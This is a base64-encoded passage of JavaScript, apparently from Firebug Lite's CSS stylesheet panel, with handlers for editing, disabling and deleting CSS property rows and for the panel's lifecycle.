cnVsZXM6IFtydWxlXSwgaW5oZXJpdGVkOiBbXSwgaW5oZXJpdExhYmVsOiAiSW5oZXJpdGVkIGZyb20iIC8vICRTVFIoIkluaGVyaXRlZEZyb20iKQ0KICAgICAgICAgICAgICAgIH0sIHRoaXMucGFuZWxOb2RlKTsNCg0KICAgICAgICAgICAgICAgIC8vL3N0eWxlUnVsZUJveCA9IHN0eWxlUnVsZUJveC5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKCJjc3NFbGVtZW50UnVsZUNvbnRhaW5lciIpWzBdOw0KICAgICAgICAgICAgICAgIHN0eWxlUnVsZUJveCA9ICQkKCIuY3NzRWxlbWVudFJ1bGVDb250YWluZXIiLCBzdHlsZVJ1bGVCb3gpWzBdOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHN0eWxlUnVsZUJveCA9IHRoaXMudGVtcGxhdGUucnVsZVRhZy5pbnNlcnRCZWZvcmUoe3J1bGU6IHJ1bGV9LCBydWxlc0JveCk7DQoNCiAgICAgICAgICAgIC8vL3N0eWxlUnVsZUJveCA9IHN0eWxlUnVsZUJveC5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKCJpbnNlcnRJbnRvIilbMF07DQogICAgICAgICAgICBzdHlsZVJ1bGVCb3ggPSAkJCgiLmluc2VydEludG8iLCBzdHlsZVJ1bGVCb3gpWzBdOw0KICAgICAgICB9DQoNCiAgICAgICAgRmlyZWJ1Zy5FZGl0b3IuaW5zZXJ0Um93Rm9yT2JqZWN0KHN0eWxlUnVsZUJveCk7DQogICAgfSwNCg0KICAgIGluc2VydFByb3BlcnR5Um93OiBmdW5jdGlvbihyb3cpDQogICAgew0KICAgICAgICBGaXJlYnVnLkVkaXRvci5pbnNlcnRSb3dGb3JPYmplY3Qocm93KTsNCiAgICB9LA0KDQogICAgaW5zZXJ0UnVsZTogZnVuY3Rpb24ocm93KQ0KICAgIHsNCiAgICAgICAgdmFyIGxvY2F0aW9uID0gZ2V0QW5jZXN0b3JCeUNsYXNzKHJvdywgImNzc1J1bGUiKTsNCiAgICAgICAgaWYgKCFsb2NhdGlvbikNCiAgICAgICAgew0KICAgICAgICAgICAgbG9jYXRpb24gPSBnZXRDaGlsZEJ5Q2xhc3ModGhpcy5wYW5lbE5vZGUsICJjc3NTaGVldCIpOw0KICAgICAgICAgICAgRmlyZWJ1Zy5FZGl0b3IuaW5zZXJ0Um93Rm9yT2JqZWN0KGxvY2F0aW9uKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIEZpcmVidWcuRWRpdG9yLmluc2VydFJvdyhsb2NhdGlvbiwgImJlZm9yZSIpOw0KICAgICAgICB9DQogICAgfSwNCg0KICAgIGVkaXRQcm9wZXJ0eVJvdzogZnVuY3Rpb24ocm93KQ0KICAgIHsNCiAgICAgICAgdmFyIHByb3BWYWx1ZUJveCA9IGdldENoaWxkQnlDbGFzcyhyb3csICJjc3NQcm9wVmFsdWUiKTsNCiAgICAgICAgRmlyZWJ1Zy5FZGl0b3Iuc3RhcnRFZGl0aW5nKHByb3BWYWx1ZUJveCk7DQogICAgfSwNCg0KICAgIGRlbGV0ZVByb3BlcnR5Um93OiBmdW5jdGlvbihyb3cpDQogICAgew0KICAgICAgICB2YXIgcnVsZSA9IEZpcmVidWcuZ2V0UmVwT2JqZWN0KHJvdyk7DQogICAgICAgIHZhciBwcm9wTmFtZSA9IGdldENoaWxkQnlDbGFzcyhyb3csICJjc3NQcm9wTmFtZSIpW3RleHRDb250ZW50XTsNCiAgICAgICAgRmlyZWJ1Zy5DU1NNb2R1bGUucmVtb3ZlUHJvcGVydHkocnVsZSwgcHJvcE5hbWUpOw0KDQogICAgICAgIC8vIFJlbW92ZSB0aGUgcHJvcGVydHkgZnJvbSB0aGUgc2VsZWN0b3IgbWFwLCBpZiBpdCB3YXMgZGlzYWJsZWQNCiAgICAgICAgdmFyIHJ1bGVJZCA9IEZpcmVidWcuZ2V0UmVwTm9kZShyb3cpLmdldEF0dHJpYnV0ZSgicnVsZUlkIik7DQogICAgICAgIGlmICggdGhpcy5jb250ZXh0LnNlbGVjdG9yTWFwICYmIHRoaXMuY29udGV4dC5zZWxlY3Rvck1hcC5oYXNPd25Qcm9wZXJ0eShydWxlSWQpICkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIG1hcCA9IHRoaXMuY29udGV4dC5zZWxlY3Rvck1hcFtydWxlSWRdOw0KICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBtYXAubGVuZ3RoOyArK2kpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKG1hcFtpXS5uYW1lID09IHByb3BOYW1lKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgbWFwLnNwbGljZShpLCAxKTsNCiAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGlmICh0aGlzLm5hbWUgPT0gInN0eWxlc2hlZXQiKQ0KICAgICAgICAgICAgZGlzcGF0Y2goW0ZpcmVidWcuQTExeU1vZGVsXSwgJ29uSW5saW5lRWRpdG9yQ2xvc2UnLCBbdGhpcywgcm93LmZpcnN0Q2hpbGQsIHRydWVdKTsNCiAgICAgICAgcm93LnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQocm93KTsNCg0KICAgICAgICB0aGlzLm1hcmtDaGFuZ2UodGhpcy5uYW1lID09ICJzdHlsZXNoZWV0Iik7DQogICAgfSwNCg0KICAgIGRpc2FibGVQcm9wZXJ0eVJvdzogZnVuY3Rpb24ocm93KQ0KICAgIHsNCiAgICAgICAgdG9nZ2xlQ2xhc3Mocm93LCAiZGlzYWJsZWRTdHlsZSIpOw0KDQogICAgICAgIHZhciBydWxlID0gRmlyZWJ1Zy5nZXRSZXBPYmplY3Qocm93KTsNCiAgICAgICAgdmFyIHByb3BOYW1lID0gZ2V0Q2hpbGRCeUNsYXNzKHJvdywgImNzc1Byb3BOYW1lIilbdGV4dENvbnRlbnRdOw0KDQogICAgICAgIGlmICghdGhpcy5jb250ZXh0LnNlbGVjdG9yTWFwKQ0KICAgICAgICAgICAgdGhpcy5jb250ZXh0LnNlbGVjdG9yTWFwID0ge307DQoNCiAgICAgICAgLy8gWFhYam9lIEdlbmVyYXRlIHVuaXF1ZSBrZXkgZm9yIGVsZW1lbnRzIHRvbw0KICAgICAgICB2YXIgcnVsZUlkID0gRmlyZWJ1Zy5nZXRSZXBOb2RlKHJvdykuZ2V0QXR0cmlidXRlKCJydWxlSWQiKTsNCiAgICAgICAgaWYgKCEodGhpcy5jb250ZXh0LnNlbGVjdG9yTWFwLmhhc093blByb3BlcnR5KHJ1bGVJZCkpKQ0KICAgICAgICAgICAgdGhpcy5jb250ZXh0LnNlbGVjdG9yTWFwW3J1bGVJZF0gPSBbXTsNCg0KICAgICAgICB2YXIgbWFwID0gdGhpcy5jb250ZXh0LnNlbGVjdG9yTWFwW3J1bGVJZF07DQogICAgICAgIHZhciBwcm9wVmFsdWUgPSBnZXRDaGlsZEJ5Q2xhc3Mocm93LCAiY3NzUHJvcFZhbHVlIilbdGV4dENvbnRlbnRdOw0KICAgICAgICB2YXIgcGFyc2VkVmFsdWUgPSBwYXJzZVByaW9yaXR5KHByb3BWYWx1ZSk7DQogICAgICAgIGlmIChoYXNDbGFzcyhyb3csICJkaXNhYmxlZFN0eWxlIikpDQogICAgICAgIHsNCiAgICAgICAgICAgIEZpcmVidWcuQ1NTTW9kdWxlLnJlbW92ZVByb3BlcnR5KHJ1bGUsIHByb3BOYW1lKTsNCg0KICAgICAgICAgICAgbWFwLnB1c2goeyJuYW1lIjogcHJvcE5hbWUsICJ2YWx1ZSI6IHBhcnNlZFZhbHVlLnZhbHVlLA0KICAgICAgICAgICAgICAgICJpbXBvcnRhbnQiOiBwYXJzZWRWYWx1ZS5wcmlvcml0eX0pOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgRmlyZWJ1Zy5DU1NNb2R1bGUuc2V0UHJvcGVydHkocnVsZSwgcHJvcE5hbWUsIHBhcnNlZFZhbHVlLnZhbHVlLCBwYXJzZWRWYWx1ZS5wcmlvcml0eSk7DQoNCiAgICAgICAgICAgIHZhciBpbmRleCA9IGZpbmRQcm9wQnlOYW1lKG1hcCwgcHJvcE5hbWUpOw0KICAgICAgICAgICAgbWFwLnNwbGljZShpbmRleCwgMSk7DQogICAgICAgIH0NCg0KICAgICAgICB0aGlzLm1hcmtDaGFuZ2UodGhpcy5uYW1lID09ICJzdHlsZXNoZWV0Iik7DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIG9uTW91c2VEb3duOiBmdW5jdGlvbihldmVudCkNCiAgICB7DQogICAgICAgIC8vY29uc29sZS5sb2coIm9uTW91c2VEb3duIiwgZXZlbnQudGFyZ2V0IHx8IGV2ZW50LnNyY0VsZW1lbnQsIGV2ZW50KTsNCiAgICAgICAgDQogICAgICAgIC8vIHh4eHBlZHJvIGFkanVzdGluZyBjb29yZGluYXRlcyBiZWNhdXNlIHRoZSBwYW5lbCBpc24ndCBhIHdpbmRvdyB5ZXQNCiAgICAgICAgdmFyIG9mZnNldCA9IGV2ZW50LmNsaWVudFggLSB0aGlzLnBhbmVsTm9kZS5wYXJlbnROb2RlLm9mZnNldExlZnQ7DQogICAgICAgIA0KICAgICAgICAvLyBYWGpvZSBIYWNrIHRvIG9ubHkgYWxsb3cgY2xpY2tpbmcgb24gdGhlIGNoZWNrYm94DQogICAgICAgIGlmICghaXNMZWZ0Q2xpY2soZXZlbnQpIHx8IG9mZnNldCA+IDIwKQ0KICAgICAgICAgICAgcmV0dXJuOw0KDQogICAgICAgIHZhciB0YXJnZXQgPSBldmVudC50YXJnZXQgfHwgZXZlbnQuc3JjRWxlbWVudDsNCiAgICAgICAgaWYgKGhhc0NsYXNzKHRhcmdldCwgInRleHRFZGl0b3IiKSkNCiAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICB2YXIgcm93ID0gZ2V0QW5jZXN0b3JCeUNsYXNzKHRhcmdldCwgImNzc1Byb3AiKTsNCiAgICAgICAgaWYgKHJvdyAmJiBoYXNDbGFzcyhyb3csICJlZGl0R3JvdXAiKSkNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5kaXNhYmxlUHJvcGVydHlSb3cocm93KTsNCiAgICAgICAgICAgIGNhbmNlbEV2ZW50KGV2ZW50KTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBvbkRvdWJsZUNsaWNrOiBmdW5jdGlvbihldmVudCkNCiAgICB7DQogICAgICAgIC8vY29uc29sZS5sb2coIm9uRG91YmxlQ2xpY2siLCBldmVudC50YXJnZXQgfHwgZXZlbnQuc3JjRWxlbWVudCwgZXZlbnQpOw0KICAgICAgICANCiAgICAgICAgLy8geHh4cGVkcm8gYWRqdXN0aW5nIGNvb3JkaW5hdGVzIGJlY2F1c2UgdGhlIHBhbmVsIGlzbid0IGEgd2luZG93IHlldA0KICAgICAgICB2YXIgb2Zmc2V0ID0gZXZlbnQuY2xpZW50WCAtIHRoaXMucGFuZWxOb2RlLnBhcmVudE5vZGUub2Zmc2V0TGVmdDsNCiAgICAgICAgDQogICAgICAgIGlmICghaXNMZWZ0Q2xpY2soZXZlbnQpIHx8IG9mZnNldCA8PSAyMCkNCiAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICB2YXIgdGFyZ2V0ID0gZXZlbnQudGFyZ2V0IHx8IGV2ZW50LnNyY0VsZW1lbnQ7DQogICAgICAgIA0KICAgICAgICAvL2NvbnNvbGUubG9nKCJvayIsIHRhcmdldCwgaGFzQ2xhc3ModGFyZ2V0LCAidGV4dEVkaXRvcklubmVyIiksICFpc0xlZnRDbGljayhldmVudCksIG9mZnNldCA8PSAyMCk7DQogICAgICAgIA0KICAgICAgICAvLyBpZiB0aGUgaW5saW5lIGVkaXRvciB3YXMgY2xpY2tlZCwgZG9uJ3QgaW5zZXJ0IGEgbmV3IHJ1bGUNCiAgICAgICAgaWYgKGhhc0NsYXNzKHRhcmdldCwgInRleHRFZGl0b3JJbm5lciIpKQ0KICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgIHZhciByb3cgPSBnZXRBbmNlc3RvckJ5Q2xhc3ModGFyZ2V0LCAiY3NzUnVsZSIpOw0KICAgICAgICBpZiAocm93ICYmICFnZXRBbmNlc3RvckJ5Q2xhc3ModGFyZ2V0LCAiY3NzUHJvcE5hbWUiKQ0KICAgICAgICAgICAgJiYgIWdldEFuY2VzdG9yQnlDbGFzcyh0YXJnZXQsICJjc3NQcm9wVmFsdWUiKSkNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5pbnNlcnRQcm9wZXJ0eVJvdyhyb3cpOw0KICAgICAgICAgICAgY2FuY2VsRXZlbnQoZXZlbnQpOw0KICAgICAgICB9DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyBleHRlbmRzIFBhbmVsDQoNCiAgICBuYW1lOiAic3R5bGVzaGVldCIsDQogICAgdGl0bGU6ICJDU1MiLA0KICAgIHBhcmVudFBhbmVsOiBudWxsLA0KICAgIHNlYXJjaGFibGU6IHRydWUsDQogICAgZGVwZW5kZW50czogWyJjc3MiLCAic3R5bGVzaGVldCIsICJkb20iLCAiZG9tU2lkZSIsICJsYXlvdXQiXSwNCiAgICANCiAgICBvcHRpb25zOg0KICAgIHsNCiAgICAgICAgaGFzVG9vbEJ1dHRvbnM6IHRydWUNCiAgICB9LA0KDQogICAgY3JlYXRlOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBGaXJlYnVnLlBhbmVsLmNyZWF0ZS5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KICAgICAgICANCiAgICAgICAgdGhpcy5vbk1vdXNlRG93biA9IGJpbmQodGhpcy5vbk1vdXNlRG93biwgdGhpcyk7DQogICAgICAgIHRoaXMub25Eb3VibGVDbGljayA9IGJpbmQodGhpcy5vbkRvdWJsZUNsaWNrLCB0aGlzKTsNCg0KICAgICAgICBpZiAodGhpcy5uYW1lID09ICJzdHlsZXNoZWV0IikNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5vbkNoYW5nZVNlbGVjdCA9IGJpbmQodGhpcy5vbkNoYW5nZVNlbGVjdCwgdGhpcyk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHZhciBkb2MgPSBGaXJlYnVnLmJyb3dzZXIuZG9jdW1lbnQ7DQogICAgICAgICAgICB2YXIgc2VsZWN0Tm9kZSA9IHRoaXMuc2VsZWN0Tm9kZSA9IGNyZWF0ZUVsZW1lbnQoInNlbGVjdCIpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBDc3NBbmFseXplci5wcm9jZXNzQWxsU3R5bGVTaGVldHMoZG9jLCBmdW5jdGlvbihkb2MsIHN0eWxlU2hlZXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIGtleSA9IFN0eWxlU2hlZXRDYWNoZS5rZXkoc3R5bGVTaGVldCk7DQogICAgICAgICAgICAgICAgdmFyIGZpbGVOYW1lID0gZ2V0RmlsZU5hbWUoc3R5bGVTaGVldC5ocmVmKSB8fCBnZXRGaWxlTmFtZShkb2MubG9jYXRpb24uaHJlZik7DQogICAgICAgICAgICAgICAgdmFyIG9wdGlvbiA9IGNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIsIHt2YWx1ZToga2V5fSk7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgb3B0aW9uLmFwcGVuZENoaWxkKEZpcmVidWcuY2hyb21lLmRvY3VtZW50LmNyZWF0ZVRleHROb2RlKGZpbGVOYW1lKSk7DQogICAgICAgICAgICAgICAgc2VsZWN0Tm9kZS5hcHBlbmRDaGlsZChvcHRpb24pOw0KICAgICAgICAgICAgfSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHRoaXMudG9vbEJ1dHRvbnNOb2RlLmFwcGVuZENoaWxkKHNlbGVjdE5vZGUpOw0KICAgICAgICB9DQogICAgICAgIC8qKi8NCiAgICB9LA0KICAgIA0KICAgIG9uQ2hhbmdlU2VsZWN0OiBmdW5jdGlvbihldmVudCkNCiAgICB7DQogICAgICAgIGV2ZW50ID0gZXZlbnQgfHwgd2luZG93LmV2ZW50Ow0KICAgICAgICB2YXIgdGFyZ2V0ID0gZXZlbnQuc3JjRWxlbWVudCB8fCBldmVudC5jdXJyZW50VGFyZ2V0Ow0KICAgICAgICB2YXIga2V5ID0gdGFyZ2V0LnZhbHVlOw0KICAgICAgICB2YXIgc3R5bGVTaGVldCA9IFN0eWxlU2hlZXRDYWNoZS5nZXQoa2V5KTsNCiAgICAgICAgDQogICAgICAgIHRoaXMudXBkYXRlTG9jYXRpb24oc3R5bGVTaGVldCk7DQogICAgfSwNCiAgICANCiAgICBpbml0aWFsaXplOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBGaXJlYnVnLlBhbmVsLmluaXRpYWxpemUuYXBwbHkodGhpcywgYXJndW1lbnRzKTsNCiAgICAgICAgDQogICAgICAgIC8vaWYgKCFkb21VdGlscykNCiAgICAgICAgLy97DQogICAgICAgIC8vICAgIHRyeSB7DQogICAgICAgIC8vICAgICAgICBkb21VdGlscyA9IENDU1YoIkBtb3ppbGxhLm9yZy9pbnNwZWN0b3IvZG9tLXV0aWxzOzEiLCAiaW5JRE9NVXRpbHMiKTsNCiAgICAgICAgLy8gICAgfSBjYXRjaCAoZXhjKSB7DQogICAgICAgIC8vICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRVJST1JTKQ0KICAgICAgICAvLyAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJAbW96aWxsYS5vcmcvaW5zcGVjdG9yL2RvbS11dGlsczsxIEZBSUxFRCB0byBsb2FkOiAiK2V4YywgZXhjKTsNCiAgICAgICAgLy8gICAgfQ0KICAgICAgICAvL30NCiAgICAgICAgDQogICAgICAgIC8vVE9ETzogeHh4cGVkcm8NCiAgICAgICAgdGhpcy5jb250ZXh0ID0gRmlyZWJ1Zy5jaHJvbWU7IC8vIFRPRE86IHh4eHBlZHJvIGNzczINCiAgICAgICAgdGhpcy5kb2N1bWVudCA9IEZpcmVidWcuY2hyb21lLmRvY3VtZW50OyAvLyBUT0RPOiB4eHhwZWRybyBjc3MyDQogICAgICAgIA0KICAgICAgICB0aGlzLmluaXRpYWxpemVOb2RlKCk7DQogICAgICAgIA0KICAgICAgICBpZiAodGhpcy5uYW1lID09ICJzdHlsZXNoZWV0IikNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHN0eWxlU2hlZXRzID0gRmlyZWJ1Zy5icm93c2VyLmRvY3VtZW50LnN0eWxlU2hlZXRzOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoc3R5bGVTaGVldHMubGVuZ3RoID4gMCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBhZGRFdmVudCh0aGlzLnNlbGVjdE5vZGUsICJjaGFuZ2UiLCB0aGlzLm9uQ2hhbmdlU2VsZWN0KTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB0aGlzLnVwZGF0ZUxvY2F0aW9uKHN0eWxlU2hlZXRzWzBdKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgLy9GaXJlYnVnLlNvdXJjZUJveFBhbmVsLmluaXRpYWxpemUuYXBwbHkodGhpcywgYXJndW1lbnRzKTsNCiAgICB9LA0KICAgIA0KICAgIHNodXRkb3duOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICAvLyBtdXN0IGRlc3Ryb3kgdGhlIGVkaXRvciB3aGVuIHdlIGxlYXZlIHRoZSBwYW5lbCB0byBhdm9pZCBwcm9ibGVtcyAoSXNzdWUgMjk4MSkNCiAgICAgICAgRmlyZWJ1Zy5FZGl0b3Iuc3RvcEVkaXRpbmcoKTsNCiAgICAgICAgDQogICAgICAgIGlmICh0aGlzLm5hbWUgPT0gInN0eWxlc2hlZXQiKQ0KICAgICAgICB7DQogICAgICAgICAgICByZW1vdmVFdmVudCh0aGlzLnNlbGVjdE5vZGUsICJjaGFuZ2UiLCB0aGlzLm9uQ2hhbmdlU2VsZWN0KTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgdGhpcy5kZXN0cm95Tm9kZSgpOw0KICAgICAgICANCiAgICAgICAgRmlyZWJ1Zy5QYW5lbC5zaHV0ZG93bi5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KICAgIH0sDQoNCiAgICBkZXN0cm95OiBmdW5jdGlvbihzdGF0ZSkNCiAgICB7DQogICAgICAgIC8vc3RhdGUuc2Nyb2xsVG9wID0gdGhpcy5wYW5lbE5vZGUuc2Nyb2xsVG9wID8gdGhpcy5wYW5lbE5vZGUuc2Nyb2xsVG9wIDogdGhpcy5sYXN0U2Nyb2xsVG9wOw0KDQogICAgICAgIC8vcGVyc2lzdE9iamVjdHModGhpcywgc3RhdGUpOw0KDQogICAgICAgIC8vIHh4eHBlZHJvIHdlIGFyZSBzdG9wcGluZyB0aGUgZWRpdG9yIGluIHRoZSBzaHV0ZG93biBtZXRob2QgYWxyZWFkeQ0KICAgICAgICAvL0ZpcmVidWcuRWRpdG9yLnN0b3BFZGl0aW5nKCk7DQogICAgICAgIEZpcmVidWcuUGFuZWwuZGVzdHJveS5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KICAgIH0sDQoNCiAgICBpbml0aWFsaXplTm9kZTogZnVuY3Rpb24ob2xkUGFuZWxOb2RlKQ0KICAgIHsNCiAgICAgICAgYWRkRXZlbnQodGhpcy5wYW5lbE5vZGUsICJtb3VzZWRvd24iLCB0aGlzLm9uTW91c2VEb3duKTsNCiAgICAgICAgYWRkRXZlbnQodGhpcy5wYW5lbE5vZGUsICJkYmxjbGljayIsIHRoaXMub25Eb3VibGVDbGljayk7DQogICAgICAgIC8vRmlyZWJ1Zy5Tb3VyY2VCb3hQYW5lbC5pbml0aWFsaXplTm9kZS5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KICAgICAgICAvL2Rpc3BhdGNoKFtGaXJlYnVnLkExMXlNb2RlbF0sICdvbkluaXRpYWxpemVOb2RlJywgW3RoaXMsICdjc3MnXSk7DQogICAgfSwNCg0KICAgIGRlc3Ryb3lOb2RlOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICByZW1vdmVFdmVudCh0aGlzLnBhbmVsTm9kZSwgIm1vdXNlZG93biIsIHRoaXMub25Nb3VzZURvd24pOw0KICAgICAgICByZW1vdmVFdmVudCh0aGlzLnBhbmVsTm9kZSwgImRibGNsaWNrIiwgdGhpcy5vbkRvdWJsZUNsaWNrKTsNCiAgICAgICAgLy9GaXJlYnVnLlNvdXJjZUJveFBhbmVsLmRlc3Ryb3lOb2RlLmFwcGx5KHRoaXMsIGFyZ3VtZW50cyk7DQogICAgICAgIC8vZGlzcGF0Y2goW0ZpcmVidWcuQTExeU1vZGVsXSwgJ29uRGVzdHJveU5vZGUnLCBbdGhpcywgJ2NzcyddKTsNCiAgICB9LA0KDQogICAgaXNob3c6IGZ1bmN0aW9uKHN0YXRlKQ0KICAgIHsNCiAgICAgICAgRmlyZWJ1Zy5JbnNwZWN0b3Iuc3RvcEluc3BlY3RpbmcodHJ1ZSk7DQoNCiAgICAgICAgdGhpcy5zaG93VG9vbGJhckJ1dHRvbnMoImZiQ1NTQnV0dG9ucyIsIHRydWUpOw0KDQogICAgICAgIGlmICh0aGlzLmNvbnRleHQubG9hZGVkICYmICF0aGlzLmxvY2F0aW9uKSAvLyB3YWl0IGZvciBsb2FkZWRDb250ZXh0IHRvIHJlc3RvcmUgdGhlIHBhbmVsDQogICAgICAgIHsNCiAgICAgICAgICAgIHJlc3RvcmVPYmplY3RzKHRoaXMsIHN0YXRlKTsNCg0KICAgICAgICAgICAgaWYgKCF0aGlzLmxvY2F0aW9uKQ0KICAgICAgICAgICAgICAgIHRoaXMubG9jYXRpb24gPSB0aGlzLmdldERlZmF1bHRMb2NhdGlvbigpOw0KDQogICAgICAgICAgICBpZiAoc3RhdGUgJiYgc3RhdGUuc2Nyb2xsVG9wKQ0KICAgICAgICAgICAgICAgIHRoaXMucGFuZWxOb2RlLnNjcm9sbFRvcCA9IHN0YXRlLnNjcm9sbFRvcDsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBpaGlkZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdGhpcy5zaG93VG9vbGJhckJ1dHRvbnMoImZiQ1NTQnV0dG9ucyIsIGZhbHNlKTsNCg0KICAgICAgICB0aGlzLmxhc3RTY3JvbGxUb3AgPSB0aGlzLnBhbmVsTm9kZS5zY3JvbGxUb3A7DQogICAgfSwNCg0KICAgIHN1cHBvcnRzT2JqZWN0OiBmdW5jdGlvbihvYmplY3QpDQogICAgew0KICAgICAgICBpZiAob2JqZWN0IGluc3RhbmNlb2YgQ1NTU3R5bGVTaGVldCkNCiAgICAgICAgICAgIHJldHVybiAxOw0KICAgICAgICBlbHNlIGlmIChvYmplY3QgaW5zdGFuY2VvZiBDU1NTdHlsZVJ1bGUpDQogICAgICAgICAgICByZXR1cm4gMjsNCiAgICAgICAgZWxzZSBpZiAob2JqZWN0IGluc3RhbmNlb2YgQ1NTU3R5bGVEZWNsYXJhdGlvbikNCiAgICAgICAgICAgIHJldHVybiAyOw0KICAgICAgICBlbHNlIGlmIChvYmplY3QgaW5zdGFuY2VvZiBTb3VyY2VMaW5rICYmIG9iamVjdC50eXBlID09ICJjc3MiICYmIHJlQ1NTLnRlc3Qob2JqZWN0LmhyZWYpKQ0KICAgICAgICAgICAgcmV0dXJuIDI7DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHJldHVybiAwOw0KICAgIH0sDQoNCiAgICB1cGRhdGVMb2NhdGlvbjogZnVuY3Rpb24oc3R5bGVTaGVldCkNCiAgICB7DQogICAgICAgIGlmICghc3R5bGVTaGVldCkNCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgaWYgKHN0eWxlU2hlZXQuZWRpdFN0eWxlU2hlZXQpDQogICAgICAgICAgICBzdHlsZVNoZWV0ID0gc3R5bGVTaGVldC5lZGl0U3R5bGVTaGVldC5zaGVldDsNCiAgICAgICAgDQogICAgICAgIC8vIGlmIGl0IGlzIGEgcmVzdHJpY3RlZCBzdHlsZXNoZWV0LCBzaG93IHRoZSB3YXJuaW5nIG1lc3NhZ2UgYW5kIGFib3J0IHRoZSB1cGRhdGUgcHJvY2Vzcw0KICAgICAgICBpZiAoc3R5bGVTaGVldC5yZXN0cmljdGVkKQ0KICAgICAgICB7DQogICAgICAgICAgICBGaXJlYnVnUmVwcy5XYXJuaW5nLnRhZy5yZXBsYWNlKHtvYmplY3Q6ICJBY2Nlc3NSZXN0cmljdGVkIn0sIHRoaXMucGFuZWxOb2RlKTsNCg0KICAgICAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gcmVtb3ZlIHdoZW4gdGhlcmUgdGhlIGV4dGVybmFsIHJlc291cmNlIHByb2JsZW0gaXMgZml4ZWQNCiAgICAgICAgICAgIENzc0FuYWx5emVyLmV4dGVybmFsU3R5bGVTaGVldFdhcm5pbmcudGFnLmFwcGVuZCh7DQogICAgICAgICAgICAgICAgb2JqZWN0OiAiVGhlIHN0eWxlc2hlZXQgY291bGQgbm90IGJlIGxvYWRlZCBkdWUgdG8gYWNjZXNzIHJlc3RyaWN0aW9ucy4gIiwNCiAgICAgICAgICAgICAgICBsaW5rOiAibW9yZS4uLiIsDQogICAgICAgICAgICAgICAgaHJlZjogImh0dHA6Ly9nZXRmaXJlYnVnLmNvbS93aWtpL2luZGV4LnBocC9GaXJlYnVnX0xpdGVfRkFRI0lfa2VlcF9zZWVpbmdfLjIyQWNjZXNzX3RvX3Jlc3RyaWN0ZWRfVVJJX2RlbmllZC4yMiINCiAgICAgICAgICAgIH0sIHRoaXMucGFuZWxOb2RlKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICB9DQoNCiAgICAgICAgdmFyIHJ1bGVzID0gdGhpcy5nZXRTdHlsZVNoZWV0UnVsZXModGhpcy5jb250ZXh0LCBzdHlsZVNoZWV0KTsNCg0KICAgICAgICB2YXIgcmVzdWx0Ow0KICAgICAgICBpZiAocnVsZXMubGVuZ3RoKQ0KICAgICAgICAgICAgLy8gRklYTUUgeHh4cGVkcm8gY2hyb21lbmV3IHRoaXMgaXMgbWFraW5nIGlQYWQncyBTYWZhcmkgdG8gY3Jhc2gNCiAgICAgICAgICAgIHJlc3VsdCA9IHRoaXMudGVtcGxhdGUudGFnLnJlcGxhY2Uoe3J1bGVzOiBydWxlc30sIHRoaXMucGFuZWxOb2RlKTsNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgcmVzdWx0ID0gRmlyZWJ1Z1JlcHMuV2FybmluZy50YWcucmVwbGFjZSh7b2JqZWN0OiAiRW1wdHlTdHlsZVNoZWV0In0sIHRoaXMucGFuZWxOb2RlKTsNCg0KICAgICAgICAvLyBUT0R